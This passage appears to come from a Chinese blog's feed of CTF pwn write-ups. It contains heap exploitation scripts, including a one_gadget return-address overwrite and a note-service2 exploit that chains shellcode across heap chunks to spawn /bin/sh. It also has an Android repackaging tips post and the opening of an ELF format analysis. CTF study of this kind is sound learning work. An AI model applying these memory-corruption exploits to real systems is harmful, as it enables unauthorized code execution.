fakechunk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite idx 1's prev_size and</span></span><br><span class="line">    <span class="comment"># set minaddr of size to '\x00'</span></span><br><span class="line">    <span class="comment"># idx 0's chunk size is 0x20</span></span><br><span class="line">    diff = heap_base + <span class="number">0x20</span> - fakechunk_addr</span><br><span class="line">    log.info(<span class="string">'diff between idx1 and fakechunk: '</span> + hex(diff))</span><br><span class="line">    <span class="comment"># '\0' padding caused by strcpy</span></span><br><span class="line">    diff_strip = p64(diff).strip(<span class="string">'\0'</span>)</span><br><span class="line">    number_of_zeros = len(p64(diff)) - len(diff_strip)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(number_of_zeros + <span class="number">1</span>):</span><br><span class="line">        data = diff_strip.rjust(<span class="number">0x18</span> - i, <span class="string">'f'</span>)</span><br><span class="line">        edit(<span class="number">1</span>, data)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nDeleted.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fix the fake chunk size, fd and bk</span></span><br><span class="line">    <span class="comment"># fd and bk must be unsorted bin</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena + <span class="number">88</span>) +</span><br><span class="line">         p64(main_arena + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. overwrite malloc_hook with one_gadget</span></span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0x45216</span></span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line">    log.info(<span class="string">'one gadget addr: '</span> + hex(one_gadget_addr))</span><br><span class="line">    log.info(<span class="string">'environ pointer addr: '</span> + hex(environ_pointer))</span><br><span class="line">    <span class="comment">#fake_malloc_chunk = main_arena - 60 + 9</span></span><br><span class="line">    <span class="comment"># set memo[0].size = 'a'*8,</span></span><br><span class="line">    <span class="comment"># set memo[0].content point to environ to leak environ addr</span></span><br><span class="line">    fake_pad = <span class="string">'f'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span> - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(</span><br><span class="line">        environ_pointer) + <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x602148</span>)</span><br><span class="line">    <span class="comment"># get a fake chunk</span></span><br><span class="line">    add(<span class="number">0x100</span> - <span class="number">8</span>, fake_pad)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get environ addr</span></span><br><span class="line">    p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">    environ_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    environ_addr = u64(environ_addr)</span><br><span class="line">    main_ret_addr = environ_addr - <span class="number">30</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set memo[0].content point to main_ret_addr</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret_addr))</span><br><span class="line">    <span class="comment"># overwrite main_ret_addr with one_gadget addr</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><h2 id="2020-3-6"><a href="#2020-3-6" class="headerlink" title="2020-3-6"></a>2020-3-6</h2><h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><h4 id="前言批话"><a href="#前言批话" class="headerlink" title="前言批话"></a>前言批话</h4><p>竟然一个月没上 adworld 了？？以后建个 repo 专门放 pwn，不在这更了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>题目：adworld – note-service2</p><p>害，我都没看出来这是个啥。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_C07</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  ____ _   _ ___  ____ ____ ___  ____ ____ ____ ____ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  |     \\_/  |__] |___ |__/ |__] |___ |__| |    |___ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  |___   |   |__] |___ |  \\ |    |___ |  | |___ |___ "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#                                                     "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"#  Welcome to CyberPeace note service 2!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"#                                                     "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是读个数字，choice，最后用了神奇的 atoi 函数，这个函数会略过前面非数字的字母，到 ‘\0’ 转换结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B91</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_B69((__int64)&amp;nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(&amp;nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_AC3</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">      v1 = sub_B91();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">      result = sub_B91();</span><br><span class="line">      v2 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 这个 v1 可以越界，就是任意地址写</span></span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">        sub_B69(qword_2020A0[v1], v2);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v0 = sub_B91();</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020A0[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol><li>checksec 发现没有 NX，也就是堆可执行。</li><li>由于一个堆块只能写 7 个字节，所有要跳，把需要的指令写到不同堆块里，每个堆块跳到下一个堆块。</li><li>修改 atoi 的 got 表，触发。</li><li>输入 /bin/sh，香。</li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(p, index, sz, cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>, str(sz))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./note-service2"</span>)</span><br><span class="line"><span class="comment">#p = remote("111.198.29.45", 43943)</span></span><br><span class="line"></span><br><span class="line">ASM = []</span><br><span class="line">ASM.append(asm(<span class="string">"xor rax,rax"</span>) + <span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"mov eax,0x3b"</span>) + <span class="string">b"\xeb\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"xor rsi,rsi"</span>) + <span class="string">b"\x90\x90\xed\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"xor rdx,rdx"</span>) + <span class="string">b"\x90\x90\xed\x19"</span>)</span><br><span class="line">ASM.append(asm(<span class="string">"syscall"</span>) + <span class="string">b"\x90\x90\x90\x90\x90"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">    create(p, i, <span class="number">8</span>, ASM[i])</span><br><span class="line"></span><br><span class="line">delete(p, <span class="number">0</span>)</span><br><span class="line">create(p, <span class="number">-8</span>, <span class="number">8</span>, ASM[<span class="number">0</span>])</span><br><span class="line">p.sendlineafter(<span class="string">"your choice&gt;&gt;"</span>, <span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但是我 cat flag 的时候跪了啊啊啊啊。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">'cat flag\n'</span></span><br><span class="line">$ cat flag.txt</span><br><span class="line">[DEBUG] Sent 0xd bytes:</span><br><span class="line">    <span class="string">'cat flag.txt\n'</span></span><br><span class="line">[*] Closed connection to 111.198.29.45 port 43943</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br><span class="line">[*] Stopped process <span class="string">'./note-service2'</span> (pid 4204)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ssj 最近闲的*疼，决定每天写一道 pwn 题（也可能是几道）。&lt;/p&gt;
&lt;h2 id=&quot;2020-1-21&quot;&gt;&lt;a href=&quot;#2020-1-21&quot; class=&quot;headerlink&quot; title=&quot;2020-1-21&quot;&gt;&lt;/a&gt;2020-1-21&lt;/h2&gt;&lt;h3 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/categories/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/categories/CTF/pwn/"/>
    
    
      <category term="CTF" scheme="https://github.com/Cracke-S-J/tags/CTF/"/>
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>逆向改包 Tips</title>
    <link href="https://github.com/Cracke-S-J/2019/12/01/majiabao/"/>
    <id>https://github.com/Cracke-S-J/2019/12/01/majiabao/</id>
    <published>2019-12-01T03:47:25.000Z</published>
    <updated>2020-03-21T11:19:15.666Z</updated>
    
    <content type="html"><![CDATA[<ol><li>配置网络访问权限及其它权限</li><li>注册Activity</li><li>androidx 有问题可换成 android</li><li>改资源 id</li><li>改类名</li><li>smali/androidx 要复制过去</li></ol><p>开发时遇到问题一是 android 9 以上的网络问题，二是爆栈触发 GC，延迟 30 多秒后起来，网上搜来的代码一定要看一下，直接用有 bug。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">network-security-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base-config</span> <span class="attr">cleartextTrafficPermitted</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"system"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">certificates</span> <span class="attr">src</span>=<span class="string">"user"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">trust-anchors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">base-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">network-security-config</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag"><span class="attr">...</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:networkSecurityConfig</span>=<span class="string">"@xml/network_security_config"</span></span></span><br><span class="line"><span class="tag"><span class="attr">...</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### ssj</span></span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Landroid/content/Intent;</span></span><br><span class="line">   <span class="built_in"> const-class </span>v1, <span class="class">Lcom/ssj/loopviewdemo/LunbotuActivity;</span></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0, p0, v1&#125;, <span class="class">Landroid/content/Intent;</span>-&gt;&lt;init&gt;(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/Class;</span>)V</span><br><span class="line"><span class="keyword">    .line</span> 15</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"intent"</span>:<span class="class">Landroid/content/Intent;</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v0&#125;, <span class="class">Lcom/gxswine/new7/MainActivity;</span>-&gt;startActivity(<span class="class">Landroid/content/Intent;</span>)V</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;配置网络访问权限及其它权限&lt;/li&gt;
&lt;li&gt;注册Activity&lt;/li&gt;
&lt;li&gt;androidx 有问题可换成 android&lt;/li&gt;
&lt;li&gt;改资源 id&lt;/li&gt;
&lt;li&gt;改类名&lt;/li&gt;
&lt;li&gt;smali/androidx 要复制过去&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
      <category term="马甲包" scheme="https://github.com/Cracke-S-J/categories/Android/%E9%A9%AC%E7%94%B2%E5%8C%85/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="马甲包" scheme="https://github.com/Cracke-S-J/tags/%E9%A9%AC%E7%94%B2%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>ELF 文件格式分析</title>
    <link href="https://github.com/Cracke-S-J/2019/10/21/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2019/10/21/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/</id>
    <published>2019-10-21T11:13:21.000Z</published>
    <updated>2020-03-23T09:14:17.169Z</updated>
    
    <content type="html"><![CDATA[<p>ELF 文件结构屡看屡忘，写个 hello.c 分析一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">        a = a + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc hello.c -o hello</code>，用<code>readelf -a hello</code>查看文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&apos;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x80482e0</span><br><span class="line">  Start of program headers:          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6072 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 28</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000040 10   A  6   1  4</span><br><span 